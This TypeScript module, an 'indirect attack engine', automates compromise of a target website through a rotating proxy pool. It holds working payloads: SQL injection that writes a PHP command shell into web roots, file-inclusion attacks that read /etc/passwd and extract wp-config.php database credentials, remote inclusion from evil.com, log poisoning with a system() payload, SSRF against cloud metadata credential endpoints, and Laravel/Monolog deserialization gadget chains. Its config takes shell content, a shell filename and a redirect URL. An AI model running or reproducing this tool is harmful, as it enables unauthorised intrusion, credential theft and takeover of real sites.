/**
 * Indirect Attack Engine — Exploitation vectors that don't use direct file upload
 * 
 * Vectors:
 * 1. SQL Injection → INTO OUTFILE (write PHP shell via SQL)
 * 2. Local File Inclusion (LFI) → read sensitive files, chain with log poisoning
 * 3. Remote File Inclusion (RFI) → include remote PHP shell
 * 4. Log Poisoning → inject PHP into access logs, then LFI to execute
 * 5. SSRF (Server-Side Request Forgery) → access internal services
 * 6. PHP Deserialization → RCE via unserialize()
 */

import { fetchWithPoolProxy } from "./proxy-pool";

// Helper: wrap fetch with proxy pool
async function indirectFetch(url: string, init: RequestInit & { signal?: AbortSignal } = {}): Promise<Response> {
  const domain = url.replace(/^https?:\/\//, "").replace(/[\/:].*$/, "");
  const { response } = await fetchWithPoolProxy(url, init, { targetDomain: domain, timeout: 15000 });
  return response;
}


export interface IndirectAttackResult {
  vector: string;
  success: boolean;
  fileUrl: string | null;
  detail: string;
  evidence: string;
  severity: "critical" | "high" | "medium" | "low" | "info";
  exploitable: boolean;
}

export interface IndirectAttackConfig {
  targetUrl: string;
  shellContent: string;
  shellFilename: string;
  redirectUrl: string;
  timeout?: number;
  onProgress?: (vector: string, detail: string) => void;
}

// ═══════════════════════════════════════════════════════
//  1. SQL INJECTION → FILE WRITE
// ═══════════════════════════════════════════════════════

const SQL_INJECTION_PAYLOADS = [
  // Error-based detection
  { payload: "'", type: "error_single_quote" },
  { payload: "\"", type: "error_double_quote" },
  { payload: "' OR '1'='1", type: "boolean_or" },
  { payload: "' OR 1=1--", type: "boolean_comment" },
  { payload: "1' AND 1=1--", type: "boolean_and_true" },
  { payload: "1' AND 1=2--", type: "boolean_and_false" },
  // Union-based detection
  { payload: "' UNION SELECT NULL--", type: "union_1col" },
  { payload: "' UNION SELECT NULL,NULL--", type: "union_2col" },
  { payload: "' UNION SELECT NULL,NULL,NULL--", type: "union_3col" },
  { payload: "' UNION SELECT NULL,NULL,NULL,NULL--", type: "union_4col" },
  // Time-based blind
  { payload: "' OR SLEEP(3)--", type: "time_sleep" },
  { payload: "1' AND (SELECT SLEEP(3))--", type: "time_and_sleep" },
  { payload: "'; WAITFOR DELAY '0:0:3'--", type: "time_mssql" },
];

const SQL_FILE_WRITE_PAYLOADS = [
  // MySQL INTO OUTFILE
  `' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/FILENAME'--`,
  `' UNION SELECT CHAR(60,63,112,104,112,32,115,121,115,116,101,109,40,36,95,71,69,84,91,34,99,109,100,34,93,41,59,32,63,62) INTO OUTFILE '/var/www/html/FILENAME'--`,
  // MySQL INTO DUMPFILE (binary safe)
  `' UNION SELECT LOAD_FILE('/etc/passwd') INTO DUMPFILE '/var/www/html/FILENAME'--`,
  // PostgreSQL COPY
  `'; COPY (SELECT 'SHELLCONTENT') TO '/var/www/html/FILENAME';--`,
  // Alternative web roots
  `' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/FILENAME'--`,
  `' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/home/www/FILENAME'--`,
  `' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/usr/share/nginx/html/FILENAME'--`,
  `' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/srv/www/htdocs/FILENAME'--`,
];

async function trySqlInjection(config: IndirectAttackConfig): Promise<IndirectAttackResult[]> {
  const results: IndirectAttackResult[] = [];
  const log = config.onProgress || (() => {});
  const baseUrl = config.targetUrl.replace(/\/$/, "");
  const timeout = config.timeout || 10000;

  // Find injectable parameters
  const testPaths = [
    `${baseUrl}/?id=1`,
    `${baseUrl}/?page=1`,
    `${baseUrl}/?cat=1`,
    `${baseUrl}/?p=1`,
    `${baseUrl}/index.php?id=1`,
    `${baseUrl}/product.php?id=1`,
    `${baseUrl}/article.php?id=1`,
    `${baseUrl}/news.php?id=1`,
    `${baseUrl}/view.php?id=1`,
    `${baseUrl}/search.php?q=test`,
  ];

  for (const testUrl of testPaths) {
    log("sqli", `Testing SQLi on: ${testUrl}`);

    // Get baseline response
    let baselineLength = 0;
    try {
      const baseResp = await indirectFetch(testUrl, { signal: AbortSignal.timeout(timeout) });
      const baseText = await baseResp.text();
      baselineLength = baseText.length;
    } catch {
      continue;
    }

    // Test for SQL injection
    let isVulnerable = false;
    let vulnType = "";

    for (const { payload, type } of SQL_INJECTION_PAYLOADS.slice(0, 6)) {
      try {
        const injUrl = testUrl.replace(/=([^&]*)/, `=${encodeURIComponent(payload)}`);
        const startTime = Date.now();
        const resp = await indirectFetch(injUrl, { signal: AbortSignal.timeout(timeout) });
        const elapsed = Date.now() - startTime;
        const text = await resp.text();

        // Check for SQL errors in response
        const sqlErrors = [
          "mysql_fetch", "mysql_num_rows", "mysql_query",
          "You have an error in your SQL syntax",
          "Warning: mysql", "Warning: pg_",
          "ORA-01756", "ORA-00933",
          "Microsoft OLE DB Provider",
          "Unclosed quotation mark",
          "SQLSTATE[",
          "PDOException",
          "pg_query",
          "sqlite3",
        ];

        const hasError = sqlErrors.some(err => text.toLowerCase().includes(err.toLowerCase()));

        if (hasError) {
          isVulnerable = true;
          vulnType = type;
          log("sqli", `🔓 SQL Injection found! Type: ${type} on ${testUrl}`);
          break;
        }

        // Time-based detection
        if (type.startsWith("time_") && elapsed > 2500) {
          isVulnerable = true;
          vulnType = type;
          log("sqli", `🔓 Time-based SQL Injection found! (${elapsed}ms delay)`);
          break;
        }

        // Boolean-based detection (significant length difference)
        if (type.startsWith("boolean_") && Math.abs(text.length - baselineLength) > 100) {
          isVulnerable = true;
          vulnType = type;
          break;
        }
      } catch {
        continue;
      }
    }

    if (isVulnerable) {
      results.push({
        vector: "sqli_detection",
        success: true,
        fileUrl: null,
        detail: `SQL Injection found: ${vulnType} on ${testUrl}`,
        evidence: `Vulnerable parameter at ${testUrl}`,
        severity: "critical",
        exploitable: true,
      });

      // Try file write via SQL injection
      log("sqli", "Attempting file write via SQL injection...");
      for (const writePayload of SQL_FILE_WRITE_PAYLOADS.slice(0, 4)) {
        const payload = writePayload
          .replace("FILENAME", config.shellFilename)
          .replace("SHELLCONTENT", config.shellContent.replace(/'/g, "\\'"));

        try {
          const injUrl = testUrl.replace(/=([^&]*)/, `=${encodeURIComponent(payload)}`);
          await indirectFetch(injUrl, { signal: AbortSignal.timeout(timeout) });

          // Check if file was created
          const webRoots = ["/var/www/html/", "/var/www/", "/home/www/"];
          for (const root of webRoots) {
            const fileUrl = `${baseUrl}/${config.shellFilename}`;
            try {
              const checkResp = await indirectFetch(fileUrl, {
                method: "HEAD",
                signal: AbortSignal.timeout(5000),
              });
              if (checkResp.status >= 200 && checkResp.status < 400) {
                results.push({
                  vector: "sqli_file_write",
                  success: true,
                  fileUrl,
                  detail: `Shell written via SQL injection INTO OUTFILE`,
                  evidence: `File created at ${fileUrl}`,
                  severity: "critical",
                  exploitable: true,
                });
                return results;
              }
            } catch {
              // Continue
            }
          }
        } catch {
          continue;
        }
      }
    }
  }

  if (results.length === 0) {
    results.push({
      vector: "sqli",
      success: false,
      fileUrl: null,
      detail: "No SQL injection vulnerabilities found",
      evidence: "",
      severity: "info",
      exploitable: false,
    });
  }

  return results;
}

// ═══════════════════════════════════════════════════════
//  2. LOCAL FILE INCLUSION (LFI)
// ═══════════════════════════════════════════════════════

const LFI_PAYLOADS = [
  // Basic traversal
  "../../../../etc/passwd",
  "../../../etc/passwd",
  "../../etc/passwd",
  // Null byte (PHP < 5.3.4)
  "../../../../etc/passwd%00",
  "../../../../etc/passwd\x00",
  // Double encoding
  "..%252f..%252f..%252f..%252fetc/passwd",
  "..%c0%af..%c0%af..%c0%afetc/passwd",
  // PHP wrappers
  "php://filter/convert.base64-encode/resource=/etc/passwd",
  "php://filter/convert.base64-encode/resource=index.php",
  "php://filter/convert.base64-encode/resource=wp-config.php",
  "php://input",
  "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
  // Proc self
  "/proc/self/environ",
  "/proc/self/fd/0",
  "/proc/self/fd/1",
  "/proc/self/fd/2",
  // Windows paths
  "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
  "..\\..\\..\\..\\boot.ini",
  // Sensitive files
  "../../../../var/log/apache2/access.log",
  "../../../../var/log/apache2/error.log",
  "../../../../var/log/nginx/access.log",
  "../../../../var/log/nginx/error.log",
  "../../../../var/log/httpd/access_log",
];

async function tryLfi(config: IndirectAttackConfig): Promise<IndirectAttackResult[]> {
  const results: IndirectAttackResult[] = [];
  const log = config.onProgress || (() => {});
  const baseUrl = config.targetUrl.replace(/\/$/, "");
  const timeout = config.timeout || 10000;

  // Find parameters that might be vulnerable to LFI
  const testPaths = [
    `${baseUrl}/?page=home`,
    `${baseUrl}/?file=index`,
    `${baseUrl}/?include=header`,
    `${baseUrl}/?template=default`,
    `${baseUrl}/?path=main`,
    `${baseUrl}/?lang=en`,
    `${baseUrl}/?view=home`,
    `${baseUrl}/?module=main`,
    `${baseUrl}/index.php?page=home`,
    `${baseUrl}/index.php?file=index`,
  ];

  for (const testUrl of testPaths) {
    for (const payload of LFI_PAYLOADS.slice(0, 10)) {
      try {
        const injUrl = testUrl.replace(/=([^&]*)/, `=${encodeURIComponent(payload)}`);
        log("lfi", `Testing LFI: ${payload.slice(0, 40)}...`);

        const resp = await indirectFetch(injUrl, { signal: AbortSignal.timeout(timeout) });
        const text = await resp.text();

        // Check for /etc/passwd content
        if (text.includes("root:x:0:0:") || text.includes("root:*:0:0:")) {
          results.push({
            vector: "lfi",
            success: true,
            fileUrl: null,
            detail: `LFI found: ${payload} on ${testUrl}`,
            evidence: text.slice(0, 300),
            severity: "critical",
            exploitable: true,
          });

          // Try to read wp-config.php for credentials
          const wpConfigPayload = payload.replace("etc/passwd", "var/www/html/wp-config.php");
          try {
            const wpResp = await indirectFetch(
              testUrl.replace(/=([^&]*)/, `=${encodeURIComponent(wpConfigPayload)}`),
              { signal: AbortSignal.timeout(timeout) },
            );
            const wpText = await wpResp.text();
            if (wpText.includes("DB_PASSWORD") || wpText.includes("DB_NAME")) {
              results.push({
                vector: "lfi_wp_config",
                success: true,
                fileUrl: null,
                detail: "wp-config.php read via LFI — credentials extracted",
                evidence: wpText.slice(0, 500),
                severity: "critical",
                exploitable: true,
              });
            }
          } catch {
            // Continue
          }

          return results;
        }

        // Check for base64 encoded content (PHP wrapper)
        if (payload.includes("base64-encode") && text.match(/^[A-Za-z0-9+/=]{50,}$/m)) {
          const decoded = Buffer.from(text.match(/[A-Za-z0-9+/=]{50,}/)?.[0] || "", "base64").toString();
          results.push({
            vector: "lfi_php_wrapper",
            success: true,
            fileUrl: null,
            detail: `PHP filter wrapper LFI found — source code readable`,
            evidence: decoded.slice(0, 300),
            severity: "critical",
            exploitable: true,
          });
          return results;
        }
      } catch {
        continue;
      }
    }
  }

  if (results.length === 0) {
    results.push({
      vector: "lfi",
      success: false,
      fileUrl: null,
      detail: "No LFI vulnerabilities found",
      evidence: "",
      severity: "info",
      exploitable: false,
    });
  }

  return results;
}

// ═══════════════════════════════════════════════════════
//  3. REMOTE FILE INCLUSION (RFI)
// ═══════════════════════════════════════════════════════

async function tryRfi(config: IndirectAttackConfig): Promise<IndirectAttackResult[]> {
  const results: IndirectAttackResult[] = [];
  const log = config.onProgress || (() => {});
  const baseUrl = config.targetUrl.replace(/\/$/, "");
  const timeout = config.timeout || 10000;

  // RFI test URLs (we use a harmless canary file)
  const rfiTestUrls = [
    "http://evil.com/shell.txt",
    "https://pastebin.com/raw/test",
    "data://text/plain;base64,PD9waHAgZWNobyAnUkZJX1RFU1RfU1VDQ0VTUyc7Pz4=",
    "expect://id",
    "php://input",
  ];

  const testPaths = [
    `${baseUrl}/?page=home`,
    `${baseUrl}/?file=index`,
    `${baseUrl}/?include=header`,
    `${baseUrl}/index.php?page=home`,
  ];

  for (const testUrl of testPaths) {
    for (const rfiUrl of rfiTestUrls) {
      try {
        const injUrl = testUrl.replace(/=([^&]*)/, `=${encodeURIComponent(rfiUrl)}`);
        log("rfi", `Testing RFI: ${rfiUrl.slice(0, 40)}...`);

        const resp = await indirectFetch(injUrl, {
          method: rfiUrl === "php://input" ? "POST" : "GET",
          body: rfiUrl === "php://input" ? "<?php echo 'RFI_TEST_SUCCESS'; ?>" : undefined,
          signal: AbortSignal.timeout(timeout),
        });
        const text = await resp.text();

        if (text.includes("RFI_TEST_SUCCESS")) {
          results.push({
            vector: "rfi",
            success: true,
            fileUrl: null,
            detail: `RFI found via ${rfiUrl} on ${testUrl}`,
            evidence: "Remote code execution possible",
            severity: "critical",
            exploitable: true,
          });
          return results;
        }
      } catch {
        continue;
      }
    }
  }

  results.push({
    vector: "rfi",
    success: false,
    fileUrl: null,
    detail: "No RFI vulnerabilities found",
    evidence: "",
    severity: "info",
    exploitable: false,
  });

  return results;
}

// ═══════════════════════════════════════════════════════
//  4. LOG POISONING
// ═══════════════════════════════════════════════════════

async function tryLogPoisoning(config: IndirectAttackConfig): Promise<IndirectAttackResult[]> {
  const results: IndirectAttackResult[] = [];
  const log = config.onProgress || (() => {});
  const baseUrl = config.targetUrl.replace(/\/$/, "");
  const timeout = config.timeout || 10000;

  // Step 1: Inject PHP code into User-Agent (gets written to access log)
  log("log_poison", "Injecting PHP payload into User-Agent header...");

  const phpPayload = `<?php system($_GET['cmd']); ?>`;
  const poisonedUA = `Mozilla/5.0 ${phpPayload}`;

  try {
    await indirectFetch(baseUrl, {
      method: "GET",
      headers: { "User-Agent": poisonedUA },
      signal: AbortSignal.timeout(timeout),
    });
  } catch {
    // Even if request fails, the UA might be logged
  }

  // Step 2: Try to include the log file via LFI
  const logPaths = [
    "/var/log/apache2/access.log",
    "/var/log/apache2/error.log",
    "/var/log/httpd/access_log",
    "/var/log/httpd/error_log",
    "/var/log/nginx/access.log",
    "/var/log/nginx/error.log",
    "/proc/self/environ",
    "/proc/self/fd/1",
  ];

  const lfiParams = ["page", "file", "include", "template", "path"];

  for (const logPath of logPaths) {
    for (const param of lfiParams) {
      try {
        const traversal = `../../../../..${logPath}`;
        const testUrl = `${baseUrl}/?${param}=${encodeURIComponent(traversal)}&cmd=id`;
        log("log_poison", `Trying log inclusion: ${logPath}`);

        const resp = await indirectFetch(testUrl, { signal: AbortSignal.timeout(timeout) });
        const text = await resp.text();

        // Check if command executed
        if (text.includes("uid=") && text.includes("gid=")) {
          results.push({
            vector: "log_poisoning",
            success: true,
            fileUrl: testUrl.replace("cmd=id", `cmd=echo '${config.shellContent}' > ${config.shellFilename}`),
            detail: `Log poisoning + LFI RCE achieved via ${logPath}`,
            evidence: text.match(/uid=\d+.*$/m)?.[0] || "Command executed",
            severity: "critical",
            exploitable: true,
          });
          return results;
        }
      } catch {
        continue;
      }
    }
  }

  results.push({
    vector: "log_poisoning",
    success: false,
    fileUrl: null,
    detail: "Log poisoning not exploitable",
    evidence: "",
    severity: "info",
    exploitable: false,
  });

  return results;
}

// ═══════════════════════════════════════════════════════
//  5. SSRF (Server-Side Request Forgery)
// ═══════════════════════════════════════════════════════

async function trySsrf(config: IndirectAttackConfig): Promise<IndirectAttackResult[]> {
  const results: IndirectAttackResult[] = [];
  const log = config.onProgress || (() => {});
  const baseUrl = config.targetUrl.replace(/\/$/, "");
  const timeout = config.timeout || 10000;

  // Common SSRF test endpoints
  const ssrfParams = ["url", "link", "src", "source", "redirect", "uri", "path", "next", "data", "reference", "site", "html", "val", "validate", "domain", "callback", "return", "page", "feed", "host", "port", "to", "out", "view", "dir"];

  // Internal targets to probe
  const internalTargets = [
    "http://127.0.0.1/",
    "http://localhost/",
    "http://169.254.169.254/latest/meta-data/", // AWS metadata
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/", // GCP metadata
    "http://100.100.100.200/latest/meta-data/", // Alibaba Cloud
    "http://127.0.0.1:3306/", // MySQL
    "http://127.0.0.1:6379/", // Redis
    "http://127.0.0.1:27017/", // MongoDB
    "http://127.0.0.1:11211/", // Memcached
    "gopher://127.0.0.1:6379/_INFO", // Redis via gopher
  ];

  // Find URL parameters
  const testPaths = [
    `${baseUrl}/?url=https://example.com`,
    `${baseUrl}/?link=https://example.com`,
    `${baseUrl}/?src=https://example.com`,
    `${baseUrl}/?redirect=https://example.com`,
    `${baseUrl}/proxy?url=https://example.com`,
    `${baseUrl}/fetch?url=https://example.com`,
    `${baseUrl}/api/proxy?url=https://example.com`,
  ];

  for (const testUrl of testPaths) {
    for (const target of internalTargets.slice(0, 5)) {
      try {
        const injUrl = testUrl.replace(/=([^&]*)/, `=${encodeURIComponent(target)}`);
        log("ssrf", `Testing SSRF: ${target.slice(0, 40)}...`);

        const resp = await indirectFetch(injUrl, { signal: AbortSignal.timeout(timeout) });
        const text = await resp.text();

        // Check for internal content indicators
        if (
          text.includes("ami-id") || // AWS metadata
          text.includes("instance-id") ||
          text.includes("iam") ||
          text.includes("security-credentials") ||
          text.includes("computeMetadata") ||
          (text.includes("root:") && text.includes(":0:0:")) || // /etc/passwd via internal
          text.includes("redis_version") ||
          text.includes("MongoDB")
        ) {
          results.push({
            vector: "ssrf",
            success: true,
            fileUrl: null,
            detail: `SSRF found: can access ${target}`,
            evidence: text.slice(0, 300),
            severity: "critical",
            exploitable: true,
          });
          return results;
        }
      } catch {
        continue;
      }
    }
  }

  results.push({
    vector: "ssrf",
    success: false,
    fileUrl: null,
    detail: "No SSRF vulnerabilities found",
    evidence: "",
    severity: "info",
    exploitable: false,
  });

  return results;
}

// ═══════════════════════════════════════════════════════
//  6. PHP DESERIALIZATION
// ═══════════════════════════════════════════════════════

async function tryDeserialization(config: IndirectAttackConfig): Promise<IndirectAttackResult[]> {
  const results: IndirectAttackResult[] = [];
  const log = config.onProgress || (() => {});
  const baseUrl = config.targetUrl.replace(/\/$/, "");
  const timeout = config.timeout || 10000;

  // Common PHP deserialization payloads
  const deserPayloads = [
    // Simple object injection test
    `O:8:"stdClass":1:{s:4:"test";s:4:"test";}`,
    // Monolog RCE (common in Laravel)
    `O:32:"Monolog\\Handler\\SyslogUdpHandler":1:{s:9:"\\x00*\\x00socket";O:29:"Monolog\\Handler\\BufferHandler":7:{s:10:"\\x00*\\x00handler";O:29:"Monolog\\Handler\\BufferHandler":7:{s:10:"\\x00*\\x00handler";N;s:13:"\\x00*\\x00bufferSize";i:-1;s:9:"\\x00*\\x00buffer";a:1:{i:0;a:2:{i:0;s:2:"id";s:5:"level";i:100;}}s:8:"\\x00*\\x00level";N;s:14:"\\x00*\\x00initialized";b:1;s:14:"\\x00*\\x00bufferLimit";i:-1;s:13:"\\x00*\\x00processors";a:2:{i:0;s:7:"current";i:1;s:6:"system";}}}}`,
    // Guzzle + Laravel RCE
    `O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"\\x00*\\x00events";O:15:"Faker\\Generator":1:{s:13:"\\x00*\\x00providers";a:1:{i:0;a:2:{i:0;O:15:"Faker\\Generator":1:{s:13:"\\x00*\\x00providers";a:1:{i:0;a:2:{i:0;s:6:"system";i:1;s:11:"__construct";}}}i:1;s:11:"__construct";}}}s:8:"\\x00*\\x00event";s:2:"id";}`,
  ];

  // Common parameters that might accept serialized data
  const testParams = ["data", "token", "session", "object", "payload", "input", "state"];

  for (const param of testParams) {
    for (const payload of deserPayloads.slice(0, 2)) {
      try {
        const testUrl = `${baseUrl}/?${param}=${encodeURIComponent(payload)}`;
        log("deserialization", `Testing deserialization on ?${param}=...`);

        const resp = await indirectFetch(testUrl, { signal: AbortSignal.timeout(timeout) });
        const text = await resp.text();

        // Check for deserialization errors (indicates the app is trying to unserialize)
        if (
          text.includes("unserialize()") ||
          text.includes("__wakeup") ||
          text.includes("__destruct") ||
          text.includes("allowed_classes")
        ) {
          results.push({
            vector: "deserialization",
            success: true,
            fileUrl: null,
            detail: `PHP deserialization detected on ?${param}=`,
            evidence: text.slice(0, 300),
            severity: "high",
            exploitable: true,
          });
          return results;
        }
      } catch {
        continue;
      }
    }

    // Also try POST with serialized data
    try {
      const resp = await indirectFetch(baseUrl, {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: `${param}=${encodeURIComponent(deserPayloads[0])}`,
        signal: AbortSignal.timeout(timeout),
      });
      const text = await resp.text();

      if (text.includes("unserialize()") || text.includes("__wakeup")) {
        results.push({
          vector: "deserialization_post",
          success: true,
          fileUrl: null,
          detail: `PHP deserialization detected via POST ${param}`,
          evidence: text.slice(0, 300),
          severity: "high",
          exploitable: true,
        });
        return results;
      }
    } catch {
      continue;
    }
  }

  results.push({
    vector: "deserialization",
    success: false,
    fileUrl: null,
    detail: "No deserialization vulnerabilities found",
    evidence: "",
    severity: "info",
    exploitable: false,
  });

  return results;
}

// ═══════════════════════════════════════════════════════
//  MAIN EXPORT: Run all indirect attack vectors
// ═══════════════════════════════════════════════════════

export async function runAllIndirectAttacks(config: IndirectAttackConfig): Promise<IndirectAttackResult[]> {
  const results: IndirectAttackResult[] = [];
  const log = config.onProgress || (() => {});

  // 1. SQL Injection
  log("sqli", "💉 Vector 1: SQL Injection → File Write...");
  const sqliResults = await trySqlInjection(config);
  results.push(...sqliResults);
  if (sqliResults.some(r => r.success && r.fileUrl)) return results;

  // 2. LFI
  log("lfi", "📂 Vector 2: Local File Inclusion...");
  const lfiResults = await tryLfi(config);
  results.push(...lfiResults);

  // 3. RFI
  log("rfi", "🌐 Vector 3: Remote File Inclusion...");
  const rfiResults = await tryRfi(config);
  results.push(...rfiResults);
  if (rfiResults.some(r => r.success)) return results;

  // 4. Log Poisoning
  log("log_poison", "☠️ Vector 4: Log Poisoning + LFI...");
  const logResults = await tryLogPoisoning(config);
  results.push(...logResults);
  if (logResults.some(r => r.success)) return results;

  // 5. SSRF
  log("ssrf", "🔗 Vector 5: SSRF...");
  const ssrfResults = await trySsrf(config);
  results.push(...ssrfResults);

  // 6. Deserialization
  log("deserialization", "🧬 Vector 6: PHP Deserialization...");
  const deserResults = await tryDeserialization(config);
  results.push(...deserResults);

  return results;
}

export { trySqlInjection, tryLfi, tryRfi, tryLogPoisoning, trySsrf, tryDeserialization };
